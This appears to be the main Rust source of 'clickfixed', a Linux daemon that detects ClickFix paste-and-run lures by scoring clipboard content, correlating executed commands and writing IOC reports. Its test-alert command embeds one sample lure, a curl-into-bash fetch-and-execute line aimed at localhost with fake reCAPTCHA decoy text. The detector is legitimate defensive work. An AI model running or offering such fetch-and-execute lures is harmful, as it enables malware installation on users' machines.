//! clickfixed: Linux reference daemon.
//!
//! Three independent signals, each on its own thread. None waits on another:
//!   Signal 1 (paste-time): clipboard write -> origin -> fast path -> warn / block.
//!   Signal 2 (execution):  exec event -> correlate against clipboard hashes -> alert
//!                          immediately; also scores typed commands on heuristics alone.
//!   Signal 3 (post-hoc):   deep decode + IOC report, fed by a bounded queue that
//!                          Signal 1 never blocks on.
//!
//! Privacy: clipboard text lives only in memory for the duration of scoring. Logs carry
//! a hash prefix, verdict and feature ids, never content. Password-manager sources are
//! skipped before scoring and never logged.

mod config;
mod correlate;

use cfx_alert::{Action, Alert, AlertContext, AlertInput, Env, ProcessInfo, Sink, Suppressed};
use cfx_collect::linux::{ExecBackend, LinuxCollector};
use cfx_collect::{ClipboardControl, Collector, ExecEvent};
use cfx_engine::{DomainClass, Engine, Level, Observation, Origin, Target, Verdict};
use clap::{Parser, Subcommand};
use config::{Config, ExecSource, Mode};
use correlate::{exec_text, Entry, HashBuffer};
use std::collections::HashSet;
use std::path::PathBuf;
use std::sync::mpsc::{sync_channel, Receiver, SyncSender, TrySendError};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

#[derive(Parser)]
#[command(
    name = "clickfixed",
    version,
    about = "ClickFix paste-time detector (Linux reference daemon)"
)]
struct Cli {
    #[command(subcommand)]
    cmd: Cmd,
}

#[derive(Subcommand)]
enum Cmd {
    /// Run the daemon.
    Run {
        #[arg(long)]
        config: Option<PathBuf>,
        /// Override config mode.
        #[arg(long)]
        mode: Option<String>,
        /// Override exec source: proc | audit.
        #[arg(long)]
        exec: Option<String>,
        /// JSON logs.
        #[arg(long)]
        json: bool,
        /// DEV ONLY: load secrets from this .env file. Real environment variables win.
        #[arg(long)]
        dotenv: Option<PathBuf>,
    },
    /// Alerting: validate config and secrets, send a test alert, generate Wazuh rules.
    Alerts {
        #[command(subcommand)]
        cmd: AlertsCmd,
    },
    /// Score one command and print the verdict (no daemon).
    Check {
        text: String,
        #[arg(long)]
        config: Option<PathBuf>,
        /// Origin URL to classify (as if copied from this page).
        #[arg(long)]
        url: Option<String>,
    },
}

#[derive(Subcommand)]
enum AlertsCmd {
    /// Validate the alerting config: env vars, templates, severity mapping. Sends nothing.
    Check {
        #[arg(long)]
        config: Option<PathBuf>,
        #[arg(long)]
        dotenv: Option<PathBuf>,
    },
    /// Send one sample alert (corpus-style lure, marked as a test) to every enabled output.
    Test {
        #[arg(long)]
        config: Option<PathBuf>,
        #[arg(long)]
        dotenv: Option<PathBuf>,
    },
    /// Print the Wazuh ruleset generated from this config's severity mapping.
    WazuhRules {
        #[arg(long)]
        config: Option<PathBuf>,
    },
}

fn load_env(dotenv: Option<&std::path::Path>) -> Env {
    match dotenv {
        Some(p) => {
            eprintln!(
                "clickfixed: loading {} (dev only; real environment variables take precedence)",
                p.display()
            );
            Env::with_dotenv(p).unwrap_or_else(|e| die(&e))
        }
        None => Env::process(),
    }
}

/// Fail loudly at startup, naming every missing variable, instead of on first send.
fn start_sink(cfg: &Config, env: &Env) -> (Sink, AlertContext) {
    match Sink::start(
        &cfg.alerts,
        &cfg.outputs,
        cfg.password_managers.clone(),
        env,
        &cfg.config_dir,
    ) {
        Ok(x) => x,
        Err(e) => {
            eprint!("clickfixed: {e}");
            std::process::exit(2)
        }
    }
}

fn alerts_cmd(cmd: AlertsCmd) {
    match cmd {
        AlertsCmd::Check { config, dotenv } => {
            let cfg = Config::load(config.as_deref()).unwrap_or_else(|e| die(&e));
            let (sink, ctx) = start_sink(&cfg, &load_env(dotenv.as_deref()));
            println!(
                "alerting config OK: host={} user={} outputs=[{}] bands=[{}]",
                ctx.host,
                ctx.user,
                sink.output_names().join(", "),
                ctx.severity
                    .bands()
                    .iter()
                    .map(|b| b.name.as_str())
                    .collect::<Vec<_>>()
                    .join(", ")
            );
            sink.shutdown();
        }
        AlertsCmd::Test { config, dotenv } => {
            init_logging(false);
            let cfg = Config::load(config.as_deref()).unwrap_or_else(|e| die(&e));
            let (sink, ctx) = start_sink(&cfg, &load_env(dotenv.as_deref()));
            if sink.output_names().is_empty() {
                die("no outputs enabled");
            }
            // The demo lure: a localhost fetch-and-execute with decoy text.
            let obs = Observation::new(
                "bash -c \"$(curl -fsSL http://127.0.0.1:8765/verify.sh)\" # I am not a robot - reCAPTCHA Verification ID: 2165 [clickfixed test alert]",
            )
            .origin(Origin::Browser {
                url: Some("http://127.0.0.1:8765/lure.html".into()),
                domain_class: DomainClass::Unknown,
            })
            .target(Target::Unknown)
            .role(cfg.role);
            let (v, trace) = Engine::default().fast_path_traced(&obs);
            match Alert::build(
                &ctx,
                AlertInput {
                    action: Action::ClipboardCommandFlagged,
                    verdict: &v,
                    layers: &trace.layers,
                    origin: &obs.origin,
                    target: &obs.target,
                    source_app: Some("clickfixed-test"),
                    process: None,
                    blocked: false,
                },
            ) {
                Ok(a) => {
                    println!(
                        "sending test alert ({} / {}, dedupe {}) to: {}",
                        a.verdict().as_str(),
                        a.severity_name(),
                        &a.dedupe_key()[..12],
                        sink.output_names().join(", ")
                    );
                    sink.emit(a);
                }
                Err(e) => die(&format!("test alert suppressed: {e:?}")),
            }
            sink.shutdown();
            println!("done (delivery errors, if any, are logged above)");
        }
        AlertsCmd::WazuhRules { config } => {
            let cfg = Config::load(config.as_deref()).unwrap_or_else(|e| die(&e));
            let map = cfx_alert::SeverityMap::new(cfg.alerts.severity.clone())
                .unwrap_or_else(|e| die(&e));
            print!("{}", cfx_alert::wazuh::rules_xml(&map));
        }
    }
}

fn main() {
    let cli = Cli::parse();
    match cli.cmd {
        Cmd::Alerts { cmd } => alerts_cmd(cmd),
        Cmd::Check { text, config, url } => {
            let cfg = Config::load(config.as_deref()).unwrap_or_else(|e| die(&e));
            let origin = match url {
                Some(u) => Origin::Browser {
                    domain_class: cfg.domains.classify_url(&u),
                    url: Some(u),
                },
                None => Origin::Unknown,
            };
            let v =
                Engine::default().fast_path(&Observation::new(text).origin(origin).role(cfg.role));
            println!("{}", serde_json::to_string_pretty(&v).unwrap());
        }
        Cmd::Run {
            config,
            mode,
            exec,
            json,
            dotenv,
        } => {
            init_logging(json);
            let mut cfg = Config::load(config.as_deref()).unwrap_or_else(|e| die(&e));
            match mode.as_deref() {
                Some("warn") => cfg.mode = Mode::Warn,
                Some("block") => cfg.mode = Mode::Block,
                Some(m) => die(&format!("unknown mode {m}")),
                None => {}
            }
            match exec.as_deref() {
                Some("proc") => cfg.exec_source = ExecSource::Proc,
                Some("audit") => cfg.exec_source = ExecSource::Audit,
                Some(e) => die(&format!("unknown exec source {e}")),
                None => {}
            }
            let env = load_env(dotenv.as_deref());
            run(cfg, env);
        }
    }
}

fn die(msg: &str) -> ! {
    eprintln!("clickfixed: {msg}");
    std::process::exit(2)
}

fn init_logging(json: bool) {
    let filter =
        tracing_subscriber::EnvFilter::try_from_default_env().unwrap_or_else(|_| "info".into());
    let b = tracing_subscriber::fmt()
        .with_env_filter(filter)
        .with_writer(std::io::stderr);
    if json {
        b.json().init();
    } else {
        b.init();
    }
}

fn run(cfg: Config, env: Env) {
    let (sink, actx) = start_sink(&cfg, &env);
    drop(env);
    let sink = Arc::new(sink);
    let actx = Arc::new(actx);
    let cfg = Arc::new(cfg);
    let engine = Arc::new(Engine::default());
    let buffer = Arc::new(Mutex::new(HashBuffer::new(Duration::from_secs(
        cfg.hash_buffer_ttl_secs,
    ))));
    let collector = Arc::new(LinuxCollector {
        exec_backend: match cfg.exec_source {
            ExecSource::Proc => ExecBackend::Proc { interval_ms: 50 },
            ExecSource::Audit => ExecBackend::Audit {
                log: cfg.audit_log.clone(),
            },
        },
        ..LinuxCollector::default()
    });
    tracing::info!(mode = ?cfg.mode, exec = ?cfg.exec_source, reports = %cfg.reports_dir.display(), "clickfixed starting");
    tracing::info!(outputs = ?sink.output_names(), host = %actx.host, user = %actx.user, "alerting ready");

    // Signal 3 queue: bounded, try_send only. A slow analysis never delays Signal 1.
    let (s3_tx, s3_rx) = sync_channel::<Observation>(64);

    let s3 = {
        let (engine, cfg) = (engine.clone(), cfg.clone());
        std::thread::Builder::new()
            .name("signal3".into())
            .spawn(move || signal3(s3_rx, &engine, &cfg))
            .unwrap()
    };
    let s1 = {
        let (engine, cfg, buffer, collector, sink, actx) = (
            engine.clone(),
            cfg.clone(),
            buffer.clone(),
            collector.clone(),
            sink.clone(),
            actx.clone(),
        );
        let rx = collector.clipboard_events();
        std::thread::Builder::new()
            .name("signal1".into())
            .spawn(move || {
                let out = Alerting {
                    sink: &sink,
                    ctx: &actx,
                };
                signal1(rx, &engine, &cfg, &buffer, collector.as_ref(), s3_tx, out)
            })
            .unwrap()
    };
    let s2 = {
        let (engine, cfg, buffer, sink, actx) = (
            engine.clone(),
            cfg.clone(),
            buffer.clone(),
            sink.clone(),
            actx.clone(),
        );
        let rx = collector.exec_events();
        std::thread::Builder::new()
            .name("signal2".into())
            .spawn(move || {
                let out = Alerting {
                    sink: &sink,
                    ctx: &actx,
                };
                signal2(rx, &engine, &cfg, &buffer, out)
            })
            .unwrap()
    };
    for h in [s1, s2, s3] {
        let _ = h.join();
    }
}

#[derive(Clone, Copy)]
struct Alerting<'a> {
    sink: &'a Sink,
    ctx: &'a AlertContext,
}

impl Alerting<'_> {
    /// Build (privacy rules enforced by the schema) and emit. Never blocks.
    fn build(&self, input: AlertInput<'_>) -> Option<Arc<Alert>> {
        match Alert::build(self.ctx, input) {
            Ok(a) => Some(Arc::new(a)),
            Err(Suppressed::PasswordManager) => None,
            Err(Suppressed::NoSeverityBand) => None,
        }
    }
    fn emit(&self, a: &Alert) {
        self.sink.emit(a.clone());
    }
}

fn exec_process(ev: &ExecEvent) -> ProcessInfo {
    let name = ev
        .exe
        .as_deref()
        .or(ev.argv.first().map(String::as_str))
        .and_then(|p| p.rsplit('/').next())
        .map(String::from);
    ProcessInfo {
        pid: ev.pid,
        name,
        executable: ev.exe.clone(),
        parent_name: ev.parent_comm.clone(),
    }
}

fn feature_ids(v: &Verdict) -> Vec<&str> {
    v.features
        .iter()
        .filter(|f| f.weight > 0.0)
        .map(|f| f.feature.as_str())
        .collect()
}

fn signal1(
    rx: Receiver<cfx_collect::ClipboardEvent>,
    engine: &Engine,
    cfg: &Config,
    buffer: &Mutex<HashBuffer>,
    control: &dyn ClipboardControl,
    s3: SyncSender<Observation>,
    out: Alerting<'_>,
) {
    let mut suppressed: u64 = 0;
    for ev in rx {
        let app = ev.source.name.clone().unwrap_or_default();
        if cfg.is_password_manager(&app) {
            suppressed += 1;
            tracing::debug!(suppressed, "password manager source suppressed");
            continue;
        }
        let hash = cfx_engine::sha256_hex(ev.text.as_bytes());
        let fresh = if cfg.is_browser(&app) {
            let class = ev
                .source_url
                .as_deref()
                .map(|u| cfg.domains.classify_url(u))
                .unwrap_or(DomainClass::Unknown);
            Origin::Browser {
                url: ev.source_url.clone(),
                domain_class: class,
            }
        } else if app.is_empty() {
            Origin::Unknown
        } else {
            Origin::Application { name: app.clone() }
        };
        // Clipboard-manager mitigation: a re-write of known content inherits the first origin.
        let (inherited, known) = {
            let b = buffer.lock().unwrap();
            (b.first_origin(&hash), b.known_level(&hash))
        };
        let origin = match (&fresh, inherited) {
            (Origin::Browser { .. }, _) => fresh,
            (_, Some(first)) => first,
            _ => fresh,
        };
        // Linux cannot see the paste target at copy time; Signal 2 re-scores with the shell.
        let obs = Observation::new(ev.text)
            .origin(origin.clone())
            .target(Target::Unknown)
            .role(cfg.role);
        let (v, trace) = engine.fast_path_traced(&obs);
        tracing::info!(
            signal = 1,
            sha = &hash[..16],
            level = v.level.as_str(),
            score = format!("{:.2}", v.score),
            features = ?feature_ids(&v),
            source = %app,
            origin = obs.origin.class().as_str(),
            elapsed_us = v.elapsed.as_micros() as u64,
            truncated = ev.truncated,
            "clipboard write scored"
        );
        // Re-writes of content we already judged (gnome-shell clipboard persistence,
        // clipboard managers) do not re-alert.
        let repeat = known.is_some_and(|k| k >= v.level);
        let mut alert = None;
        if v.level >= Level::Warn && !repeat {
            let blocked = v.level == Level::Block
                && cfg.mode == Mode::Block
                && {
                    let msg = format!(
                    "# clickfixed blocked a suspicious clipboard command (sha256 {}). Do not run commands a web page asks you to paste.",
                    &hash[..12]
                );
                    match control.replace_clipboard(msg) {
                        Ok(()) => true,
                        Err(e) => {
                            tracing::error!(error = %e, "clipboard replace failed");
                            false
                        }
                    }
                };
            if cfg.notify {
                let title = if blocked {
                    "Clipboard command blocked"
                } else {
                    "Suspicious clipboard command"
                };
                notify(
                    title,
                    &format!(
                        "This looks like a ClickFix lure ({}). Don't paste it into a terminal or Run box. Signals: {}",
                        v.level.as_str(),
                        feature_ids(&v).join(", ")
                    ),
                    v.level >= Level::Block,
                );
            }
            alert = out.build(AlertInput {
                action: Action::ClipboardCommandFlagged,
                verdict: &v,
                layers: &trace.layers,
                origin: &obs.origin,
                target: &obs.target,
                source_app: (!app.is_empty()).then_some(app.as_str()),
                process: None,
                blocked,
            });
            if let Some(a) = &alert {
                out.emit(a);
            }
        }
        buffer.lock().unwrap().record(
            &obs.text,
            Entry {
                full_hash: hash.clone(),
                origin,
                first_seen: Instant::now(),
                level: v.level,
                score: v.score,
                features: feature_ids(&v).into_iter().map(String::from).collect(),
                alert,
            },
        );
        if !repeat
            && (v.level >= Level::Warn || v.needs_deep_analysis)
            && (v.level >= Level::Warn || cfx_engine::has_interpreter_token(&obs.text))
        {
            match s3.try_send(obs) {
                Ok(()) | Err(TrySendError::Disconnected(_)) => {}
                Err(TrySendError::Full(_)) => {
                    tracing::warn!("signal 3 queue full; analysis skipped")
                }
            }
        }
    }
}

fn signal2(
    rx: Receiver<ExecEvent>,
    engine: &Engine,
    cfg: &Config,
    buffer: &Mutex<HashBuffer>,
    out: Alerting<'_>,
) {
    let mut alerted: HashSet<String> = HashSet::new();
    for ev in rx {
        if ev.argv.is_empty() {
            continue;
        }
        let parent = ev.parent_comm.clone().unwrap_or_default();
        let from_shell = cfg.shells.contains(&parent);
        let matched = buffer.lock().unwrap().match_exec(&ev.argv).cloned();

        if let Some(entry) = &matched {
            // Alert immediately on the clipboard verdict. Not gated on any re-analysis.
            if entry.level >= Level::Warn && alerted.insert(entry.full_hash.clone()) {
                tracing::warn!(
                    signal = 2,
                    sha = &entry.full_hash[..16],
                    pid = ev.pid,
                    parent = %parent,
                    clipboard_level = entry.level.as_str(),
                    features = ?entry.features,
                    "PASTED COMMAND EXECUTED"
                );
                if let Some(a) = &entry.alert {
                    out.emit(&a.executed(exec_process(&ev)));
                }
                if cfg.notify {
                    notify(
                        "Pasted command was executed",
                        &format!(
                            "A clipboard command flagged as {} just ran (pid {}). Signals: {}",
                            entry.level.as_str(),
                            ev.pid,
                            entry.features.join(", ")
                        ),
                        true,
                    );
                }
            }
        }

        // Independent heuristic path (also covers typed commands, which have no clipboard
        // match and therefore no origin). Only for interactive-shell children.
        if matched.is_none() && !(from_shell && correlate::runs_its_arguments(&ev.argv)) {
            continue;
        }
        let text = exec_text(&ev.argv);
        let origin = matched
            .as_ref()
            .map(|e| e.origin.clone())
            .unwrap_or(Origin::Unknown);
        let obs = Observation::new(text)
            .origin(origin)
            .target(Target::Terminal {
                shell: parent.clone(),
            })
            .role(cfg.role);
        let (v, trace) = engine.fast_path_traced(&obs);
        if v.level >= Level::Warn {
            let key = cfx_engine::sha256_hex(obs.text.as_bytes());
            if alerted.insert(key.clone()) {
                tracing::warn!(
                    signal = 2,
                    sha = &key[..16],
                    pid = ev.pid,
                    parent = %parent,
                    level = v.level.as_str(),
                    features = ?feature_ids(&v),
                    clipboard_match = matched.is_some(),
                    "suspicious command executed"
                );
                if matched.is_none() {
                    if let Some(a) = out.build(AlertInput {
                        action: Action::SuspiciousCommandExecuted,
                        verdict: &v,
                        layers: &trace.layers,
                        origin: &obs.origin,
                        target: &obs.target,
                        source_app: None,
                        process: Some(exec_process(&ev)),
                        blocked: false,
                    }) {
                        out.emit(&a);
                    }
                }
                if cfg.notify && matched.is_none() {
                    notify(
                        "Suspicious command executed",
                        &format!("pid {} matched: {}", ev.pid, feature_ids(&v).join(", ")),
                        false,
                    );
                }
            }
        }
    }
}

fn signal3(rx: Receiver<Observation>, engine: &Engine, cfg: &Config) {
    if let Err(e) = std::fs::create_dir_all(&cfg.reports_dir) {
        tracing::error!(error = %e, "cannot create reports dir; signal 3 disabled");
        for _ in rx {}
        return;
    }
    for obs in rx {
        let report = engine.analyze(&obs);
        if report.verdict.level < Level::Warn {
            continue; // reports contain decoded content; only write them for warn+
        }
        let path = cfg
            .reports_dir
            .join(format!("{}.json", &report.verdict.sha256[..32]));
        let body = serde_json::to_vec_pretty(&report).unwrap_or_default();
        match write_private(&path, &body) {
            Ok(()) => tracing::info!(
                signal = 3,
                sha = &report.verdict.sha256[..16],
                level = report.verdict.level.as_str(),
                urls = report.iocs.urls.len(),
                domains = ?report.iocs.domains,
                path = %path.display(),
                "analysis report written"
            ),
            Err(e) => tracing::error!(error = %e, "report write failed"),
        }
    }
}

fn write_private(path: &std::path::Path, body: &[u8]) -> std::io::Result<()> {
    use std::io::Write;
    use std::os::unix::fs::OpenOptionsExt;
    let mut f = std::fs::OpenOptions::new()
        .write(true)
        .create(true)
        .truncate(true)
        .mode(0o600)
        .open(path)?;
    f.write_all(body)
}

/// Fire-and-forget desktop notification. Never blocks a signal thread.
///
/// `urgent` is for Block verdicts and flagged pastes that actually ran. Those use critical
/// urgency, which GNOME keeps on screen until dismissed. Everything else is normal and
/// transient: it shows once and does not persist or re-present from the tray.
fn notify(title: &str, body: &str, urgent: bool) {
    let mut cmd = std::process::Command::new("notify-send");
    cmd.args(["-a", "clickfixed", "-i", "dialog-warning"]);
    if urgent {
        cmd.args(["-u", "critical"]);
    } else {
        cmd.args(["-u", "normal", "-e"]);
    }
    let child = cmd.args([title, body]).spawn();
    if let Ok(mut c) = child {
        std::thread::spawn(move || {
            let _ = c.wait();
        });
    }
}
